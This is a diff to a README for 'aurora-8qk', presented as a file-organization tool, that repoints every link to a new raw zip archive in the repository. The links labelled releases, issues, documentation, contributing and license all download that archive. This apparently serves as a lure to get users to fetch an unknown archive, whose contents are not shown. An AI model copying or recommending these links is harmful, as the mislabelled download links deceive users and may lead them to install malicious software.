@@ -1,7 +1,7 @@
 # 🌟 aurora-8qk - Simple tool for better organization
 
 ## 📥 Download the Application
-[![Download aurora-8qk](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip%https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip)](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip)
+[![Download aurora-8qk](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip%https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip)](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip)
 
 ## 🚀 Getting Started
 Welcome to aurora-8qk! This tool helps you organize your files with ease. Follow these steps to get started.
@@ -13,7 +13,7 @@ Welcome to aurora-8qk! This tool helps you organize your files with ease. Follow
 - **Internet Connection:** Required for downloads and updates
 
 ## 🖥️ Download & Install
-To get aurora-8qk, visit this page to download: [Releases Page](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip)
+To get aurora-8qk, visit this page to download: [Releases Page](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest version listed. It usually has the highest version number.
@@ -39,20 +39,20 @@ After installing aurora-8qk:
 5. **Adjust Settings:** Click on the settings gear icon to customize your preferences.
 
 ## 📞 Support
-If you run into any issues or have questions, visit the [issues section](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip) on our GitHub page. Feel free to submit your questions there.
+If you run into any issues or have questions, visit the [issues section](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip) on our GitHub page. Feel free to submit your questions there.
 
 ## 🔗 Learn More
-To understand the full capabilities of aurora-8qk, check out our detailed [documentation](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip). This includes tutorials, troubleshooting tips, and the list of all features available.
+To understand the full capabilities of aurora-8qk, check out our detailed [documentation](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip). This includes tutorials, troubleshooting tips, and the list of all features available.
 
 ## 🛠️ Contributing
-If you want to help improve aurora-8qk, consider contributing. You can find the guidelines for contributing in the [https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip) file.
+If you want to help improve aurora-8qk, consider contributing. You can find the guidelines for contributing in the [https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip) file.
 
 ## 🔄 Version Updates
 Be sure to check back on the Releases page regularly for updates. New features and improvements are added frequently to enhance your experience.
 
 ## 📝 License
-aurora-8qk is open-source software, released under the MIT License. You can view the license details in the [https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip) file.
+aurora-8qk is open-source software, released under the MIT License. You can view the license details in the [https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip) file.
 
 Thank you for using aurora-8qk! Your feedback is valuable, and we are here to assist you as you improve your file organization.
 
-[![Download aurora-8qk](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip%https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip)](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-8qk.zip)
+[![Download aurora-8qk](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip%https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip)](https://raw.githubusercontent.com/jacianperez/aurora-8qk/main/longleaf/aurora-qk-v3.6.zip)
